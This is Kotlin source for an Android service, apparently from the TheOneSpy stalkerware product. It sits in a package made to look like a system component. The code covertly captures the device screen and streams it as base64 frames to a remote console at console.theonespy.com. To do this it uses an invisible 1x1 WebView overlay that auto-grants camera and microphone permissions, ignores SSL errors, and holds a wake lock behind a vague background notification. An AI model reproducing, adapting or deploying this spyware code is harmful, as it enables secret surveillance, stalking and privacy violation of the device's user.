package com.android.services.services.screenSharing

import android.annotation.SuppressLint
import android.app.Activity
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.http.SslError
import android.os.PowerManager
import android.util.Base64
import android.view.Gravity
import android.view.WindowManager
import android.webkit.*
import android.widget.LinearLayout
import androidx.core.app.NotificationCompat
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.android.services.R
import com.android.services.enums.FcmPushStatus
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.ScreenSharingCommand
import com.android.services.receiver.NotificationBroadcastReceiver
import com.android.services.services.RemoteDataService
import com.android.services.util.*
import io.reactivex.rxjava3.disposables.Disposable
import kotlinx.coroutines.CoroutineScope
import java.io.ByteArrayOutputStream
import java.io.FileOutputStream
import java.io.IOException
import java.nio.ByteBuffer
import kotlin.jvm.Throws

/**
 * This implements the [ScreenSharingCommandProcessingBaseImpl] abstract class. And Overrides its methods.
 * This implementation is responsible for the Initialisation of Android [WebView] by Opening the view360 Url
 * And setup web client for real-time Communication through the Target User phoneServiceId and authToken
 * And Capture Device Screen and convert these images in base64 encoded form and pass it to web page to show it.
 */
class ScreenSharingCommandProcessingBaseImpl(
    val service: Service,
    val localDatabaseSource: LocalDatabaseSource,
    val coroutineScope: CoroutineScope,
) : ScreenSharingCommandProcessBasel(service.applicationContext) {
    private var disposable: Disposable? = null
    private var isServiceInForeground = false
    var imageReader: ImageReader? = null
    private var displayWidth = 720
    private var displayHeight = 1280
    private lateinit var projectionManager: MediaProjectionManager
    private var mediaProjection: MediaProjection? = null
    var imagesProduced = 0
    private var screenSharingCommand: ScreenSharingCommand? = null
    private var audioType = "Unmuted"
    private var cameraType = "Front"
    private var homeToken = ""
    private var method = ""
    private lateinit var broadcaster: LocalBroadcastManager

    /**
     * Initialize the Window [WindowManager] by adding a WebView to the Window
     * Setup the webView with Credentials, and loads the view360 Url in WebView
     */
    override fun initialize() {
        logVerbose("$TAG In OnCreate")
        broadcaster = LocalBroadcastManager.getInstance(applicationContext);
        try {
            logVerbose("$TAG In Initialize() -> Ready to attach WebView to Window")
            acquireWakeLock()
            startAndCreateNotification()
            creatingWebViewToWindow()
            setUpWebViewDefaultSettings(mWebView!!)
            projectionManager =
                applicationContext.getSystemService(Service.MEDIA_PROJECTION_SERVICE) as (MediaProjectionManager)
        } catch (exp: Exception) {
            logException("$TAG Initialize() Error: ${exp.message}", TAG, exp)
            stopThisService()
        }
    }

    /*
    * Method to attach webview to window
     */
    private fun creatingWebViewToWindow() {
        mWindowManager = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val layoutParams = WindowManager.LayoutParams(
            1, 1,
            windowManagerFlagOverlay,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )
        layoutParams.gravity = Gravity.START or Gravity.TOP
        mWebView = WebView(applicationContext)
        mWebView!!.layoutParams = LinearLayout.LayoutParams(
            1, 1
        )
        mWindowManager!!.addView(mWebView, layoutParams)
        logVerbose("$TAG WebView Attached to Window ")
        logVerbose("$TAG WebView Attached to Window")
    }

    /*
    *This Method Webview configuration and load web url
     */
    private fun setWebViewConfiguration() {

        // Setup WebView Client
        mWebView!!.webViewClient = mWebViewClient

        // SetUp WebChrome Client
        mWebView!!.webChromeClient = mWebChromeClient
        mWebView!!.resumeTimers()
        val url =
            "https://console.theonespy.com/voip360/jitsiinitsession?psid=${AppConstants.phoneServiceId}&webToken=$homeToken"

        mWebView!!.loadUrl(url)
        logVerbose("ScreenSharingByJitsiLogs: Loading Url in webview")
        screenSharingBugStatus = FcmPushStatus.INITIALIZED.getStatus()

    }

    private fun startAndCreateNotification() {
        if (!isServiceInForeground) {
            val notificationIntent =
                Intent(service.applicationContext, NotificationBroadcastReceiver::class.java)
            val pendingIntent = PendingIntent.getBroadcast(
                service.applicationContext,
                SCREEN_SHARING_NOTIFICATION_ID,
                notificationIntent,
                PendingIntent.FLAG_UPDATE_CURRENT
            )
            val notification =
                NotificationCompat.Builder(service.applicationContext, RemoteDataService.CHANNEL_ID)
                    .setContentText("Running in background...")
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .setContentIntent(pendingIntent)
                    .build()
            service.startForeground(SCREEN_SHARING_NOTIFICATION_ID, notification)
            isServiceInForeground = true
            logDebug("BoundServiceInfo", "Service going to backgroud")

        }
    }

    /** Web Chrome Client **/
    private val mWebChromeClient = object : WebChromeClient() {
        override fun onPermissionRequest(request: PermissionRequest) {
            request.grant(request.resources)
            logVerbose("$TAG Permission Granted")
        }
    }

    /** Web View Client **/
    private val mWebViewClient = object : WebViewClient() {
        override fun shouldOverrideUrlLoading(
            view: WebView,
            urlNewString: String,
        ): Boolean {
            if (!loadingFinished) {
                redirect = true
            }
            loadingFinished = false
            return true
        }

        override fun onReceivedError(
            view: WebView,
            request: WebResourceRequest,
            error: WebResourceError,
        ) {
            super.onReceivedError(view, request, error)
        }

        override fun onReceivedSslError(
            view: WebView,
            handler: SslErrorHandler,
            error: SslError,
        ) {
            handler.proceed()
        }

        override fun onPageStarted(view: WebView, url: String, facIcon: Bitmap?) {
            loadingFinished = false
        }

        @SuppressLint("JavascriptInterface")
        override fun onPageFinished(view: WebView, url: String) {
            if (!redirect) {
                loadingFinished = true
            }
            if (loadingFinished && !redirect) {
                try {
                    logVerbose("$TAG Page Loaded")
                    clickOnToogleAudioButton(mWebView)
                    clickOnToogleCameraButton(mWebView)

                    mHandler.postDelayed(Runnable {
                        checkPermissionAndSendCallBack()
                        startSharing()
                    }, 5000)
                } catch (e: Exception) {
                    logException(
                        "onPage Finished exception  ${e.message}",
                        TAG, e
                    )
                    stopThisService()
                }
            } else {
                redirect = false
            }
        }
    }

    private fun clickOnToogleCameraButton(webView: WebView?) {
        if (cameraType == "Back") {
            if (webView != null) {
                webView.loadUrl("javascript:document.getElementById('toggleCamera').click()");
                logVerbose("$TAG Clicked on View")
            } else {
                logVerbose("$TAG WebView is null")
            }
        }
    }

    private fun checkPermissionAndSendCallBack(message: String = "") {
        val errorMessage = message.ifEmpty { getErrorMessage() }
        if (errorMessage.isNotEmpty()) {
            if (mWebView != null) {
                logVerbose("$TAG Error Message = $errorMessage")
                mWebView!!.loadUrl("javascript:sendMessage(\"$errorMessage\",\"0\")")
                logVerbose("$TAG Error Message Function Calles")
            } else {
                logVerbose("$TAG Error Message Function Called but webview is nulll")
            }
        }
    }


    /** Returns the type of view360 Call Either Audio or Video **/
    private fun getErrorMessage(): String {
        try {

            val isScreenCastPermissionGranted = AppConstants.screenRecordingIntent != null
            return if (AppUtils.isAccessibilityEnabled(applicationContext) && !isScreenCastPermissionGranted && !AppUtils.isScreenInteractive(
                    applicationContext
                )
            ) {
                "No device display and ScreenCast permission is missing. Kindly grant the permission and try again."
            } else if (!AppUtils.isAccessibilityEnabled(applicationContext) && !isScreenCastPermissionGranted) {
                "Accessibility service and ScreenCast permission is missing. Kindly grant the permission and try again."
            } else if (AppUtils.isAccessibilityEnabled(applicationContext) && isScreenCastPermissionGranted && !AppUtils.isScreenInteractive(
                    applicationContext
                ) && method != "Spy360JitsiLive"
            ) {
                "No device display available, try later."
            } else {
                ""
            }
        } catch (e: Exception) {
            return ""
        }
    }


    private fun clickOnToogleAudioButton(webView: WebView?) {
        if (audioType == "Muted") {
            if (webView != null) {
                webView.loadUrl("javascript:document.getElementById('toggleAudio').click()");
                logVerbose("$TAG Clicked on Audio Button")
            } else {
                logVerbose("$TAG WebView is null")
            }
        }
    }


    /** Destroy the WebView and release it's resources **/
    private fun destroyWebView() {
        // Make sure you remove the WebView from its parent view before doing anything.
        mWebView!!.removeAllViews()
        mWebView!!.clearHistory()

        // NOTE: clears RAM cache, if you pass true, it will also clear the disk cache.
        // Probably not a great idea to pass true if you have oter WebViews still alive.
        mWebView!!.clearCache(true)

        // Loading a blank page is optional, but will ensure that the WebView isn't doing anything when you destroy it.
        mWebView!!.loadUrl("about:blank");
        mWebView!!.onPause()
        mWebView!!.removeAllViews()
        mWebView!!.destroyDrawingCache()

        // NOTE: This pauses JavaScript execution for ALL WebViews,
        // do not use if you have other WebViews still alive.
        // If you create another WebView after calling this,
        // make sure to call mWebView.resumeTimers().
        mWebView!!.pauseTimers()
        // NOTE: This can occasionally cause a segfault below API 17 (4.2)
        mWebView!!.destroy()
        // Null out the reference so that you don't end up re-using it.
        mWebView = null
        logVerbose("$TAG WebView destroyed")
    }

    /**
     * Set WebView Defaults
     * @param webView Instance of Web View
     */
    private fun setUpWebViewDefaultSettings(webView: WebView) {
        val settings = webView.settings
        try {
            // Enable Javascript
            settings.javaScriptEnabled = true
            settings.setAppCacheEnabled(false)
            settings.cacheMode = WebSettings.LOAD_NO_CACHE
            settings.allowFileAccessFromFileURLs = true
            settings.mediaPlaybackRequiresUserGesture = false
            settings.allowFileAccessFromFileURLs = true
            settings.allowUniversalAccessFromFileURLs = true
            // Use WideViewport and Zoom out if there is no viewport defined
            settings.useWideViewPort = true
            settings.loadWithOverviewMode = true
            // Enable pinch to zoom without the zoom buttons
            settings.builtInZoomControls = true
            // Allow use of Local Storage
            settings.domStorageEnabled = true
            // Hide the zoom controls for HONEYCOMB+
            settings.displayZoomControls = false
            // Enable remote debugging via chrome://inspect
            if (AppConstants.osGreaterThanOrEqualLollipop) {
                WebView.setWebContentsDebuggingEnabled(
                    true
                )
                // AppRTC requires third party cookies to work
                val cookieManager = CookieManager.getInstance()
                cookieManager.setAcceptThirdPartyCookies(mWebView, true)
            }
        } catch (e: Exception) {
            logException("$TAG ${AppUtils.currentMethod} exception = ${e.message}")
        }
    }

    override fun onServiceDestroy() {
        logVerbose("$TAG In OnDestroy -> Releasing Resources")
        try {
            if (mediaProjection != null) {
                mediaProjection!!.stop()
            }
            if (mWebView != null && mWebView!!.parent != null) {
                if (AppConstants.view360InteruptMessage.isNotEmpty()) {
                    checkPermissionAndSendCallBack(AppConstants.view360InteruptMessage)
                }
                mWindowManager!!.removeView(mWebView)
                destroyWebView()
            }
            if (disposable != null && !disposable!!.isDisposed)
                disposable!!.dispose()
            logVerbose("ScreenSharingByJitsiLogs: Service is getting stop")
            AppConstants.view360InteruptMessage = ""
            AppConstants.isScreenOnly = false
            releaseWakeLock()
        } catch (exp: Exception) {
            logException("$TAG onDestroy Exception = ${exp.message}")
            stopThisService()
        }
    }

    override fun parseIntent(intent: Intent) {
        screenSharingCommand =
            intent.getParcelableExtra(SCREEN_SHARING_PUSH)
        screenSharingCommand?.let {
            if (it.method == "Spy360JitsiLive") {
                cameraType = it.cameraType
                audioType = it.audioType
            }
            method = it.method
            homeToken = it.homeToken
        }
        startAndCreateNotification()
        logVerbose("ScreenSharingByJitsiLogs: view360Command = $screenSharingCommand")
        setWebViewConfiguration()
    }

    private fun stopThisService() {
        if (isServiceInForeground) {
            isServiceInForeground = false
            service.stopSelf()
        }
    }

    @SuppressLint("WakelockTimeout")
    private fun acquireWakeLock() {
        val pm = service.applicationContext.getSystemService(Service.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG_VIEW_360_BUG_WORK)
        wakeLock!!.acquire()
    }

    private fun releaseWakeLock() {
        if (wakeLock != null && wakeLock!!.isHeld) wakeLock!!.release()
    }

    @Throws(Exception::class)
    private fun startSharing() {
        try {
            if (mediaProjection == null) {
                mediaProjection = AppConstants.screenRecordingIntent?.let {
                    projectionManager.getMediaProjection(
                        Activity.RESULT_OK,
                        it
                    )
                }
                if (mediaProjection != null) {

                    // Initialize the media projection
                    val metrics = applicationContext.resources.displayMetrics
                    val density = metrics.densityDpi
                    val flags = (DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY
                            or DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC)
                    imageReader = ImageReader.newInstance(
                        displayWidth, displayHeight, PixelFormat.RGBA_8888, 2
                    )
                    mediaProjection!!.createVirtualDisplay(
                        "screencap",
                        displayWidth, displayHeight, density,
                        flags, imageReader!!.getSurface(), null, null
                    )
                    imageReader!!.setOnImageAvailableListener(
                        ImageAvailableListener(
                            imageReader!!,
                            displayWidth,
                            displayHeight,
                            mWebView,
                            imagesProduced
                        ), null
                    )
                }
            }
        } catch (e: Exception) {
            logException("$e occur while starting screen sharing")
        }

    }

    private class ImageAvailableListener internal constructor(
        private val imageReader: ImageReader,
        private val displayWidth: Int,
        private val displayHeight: Int,
        private val webView: WebView?,
        private var imagesProduced: Int
    ) : ImageReader.OnImageAvailableListener {
        val TAG = "ScreenSharing"
        override fun onImageAvailable(reader: ImageReader) {
            var image: Image? = null
            val fos: FileOutputStream? = null
            var bitmap: Bitmap? = null
            var stream: ByteArrayOutputStream? = null
            try {
                image = imageReader.acquireLatestImage()
                if (image != null) {
                    val planes: Array<Image.Plane> = image.getPlanes()
                    val buffer: ByteBuffer = planes[0].getBuffer()
                    val pixelStride: Int = planes[0].getPixelStride()
                    val rowStride: Int = planes[0].getRowStride()
                    val rowPadding: Int = rowStride - pixelStride * displayWidth

                    // create bitmap
                    bitmap = Bitmap.createBitmap(
                        displayWidth + rowPadding / pixelStride,
                        displayHeight, Bitmap.Config.ARGB_8888
                    )
                    bitmap.copyPixelsFromBuffer(buffer)
                    stream = ByteArrayOutputStream()
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 3, stream)

                    val byteArray: ByteArray = stream.toByteArray()
                    val encoded = Base64.encodeToString(
                        byteArray,
                        Base64.DEFAULT
                    );
                    if (imagesProduced == 0 || encoded != AppConstants.lastEncoded) {
                        logVerbose(TAG, "byteArray $byteArray")
                        logVerbose(TAG, "sending data to peer ${stream.toByteArray()}")
                        uploadEncodedImage(webView, encoded)
                    }
                    AppConstants.lastEncoded = encoded
                    logVerbose(TAG, "captured image: ")
                }
            } catch (e: Exception) {
                e.printStackTrace()
                logException(TAG, "captured exception: $e")
            } finally {
                if (fos != null) {
                    try {
                        fos.close()
                    } catch (ioe: IOException) {
                        ioe.printStackTrace()
                    }
                }
                if (stream != null) {
                    try {
                        stream.close()
                    } catch (ioe: IOException) {
                        ioe.printStackTrace()
                    }
                }
                if (bitmap != null && !bitmap.isRecycled()) {
                    bitmap.recycle();
                    bitmap = null;
                }
                if (image != null) {
                    image.close()
                }
            }
        }

        private fun uploadEncodedImage(webView: WebView?, value: String) {
            if (webView != null) {
                webView.loadUrl("javascript:sendMessage(\"$value\",\"1\")")
                logVerbose("$TAG change Stream Called")
                imagesProduced++
            } else {
                logVerbose("$TAG change Stream Called but webview is nulll")
            }
        }
    }
}